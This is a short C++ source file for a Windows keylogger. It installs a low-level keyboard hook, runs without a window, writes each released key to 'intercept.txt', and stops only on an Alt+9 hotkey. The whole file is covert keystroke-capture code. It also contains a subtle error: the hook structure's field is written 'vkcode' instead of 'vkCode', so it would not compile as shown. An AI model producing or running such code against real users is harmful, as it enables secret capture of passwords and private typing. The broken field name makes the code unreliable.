#define _WIN32_WINNT 0x500
#include <windows.h>
#include <fstream>
#pragma comment(lib, "user32.lib")
using namespace std;

ofstream out("intercept.txt", ios::out);

LRESULT CALLBACK ProcessKB(int ncode, WPARAM event, LPARAM kb)
{   PKBDLLHOOKSTRUCT p = (PKBDLLHOOKSTRUCT)kb;
    if (event==WM_KEYUP) out << (char)p->vkcode;
    return CallNextHookEx(NULL, ncode, event, kb);
}

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nShowCmd)
{
    MSG msg;
    out << "Intercepted Keyboard:\n\n";
    HHOOK captest=SetWindowsHookEx(WH_KEYBOARD_LL, ProcessKB, hInstance, 0);

    RegisterHotKey(NULL,1,MOD_ALT,0x39);
    while (GetMessage(&msg, NULL, 0, 0)!=0)
    { if(msg.message == WM_HOTKEY)
        { UnhookWindowsHookEx(captest);
            out << "\n\nEnd Intercept\n";
            out.close();
            return(0);
        }
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    // Unregister the hotkey and unhook the kb hook before exiting
    UnregisterHotKey(NULL, 1);
    UnhookWindowsHookEx(captest);

    // Close the output file
    out.close();

    // Return the exit code
    return (int)msg.wParam;
}

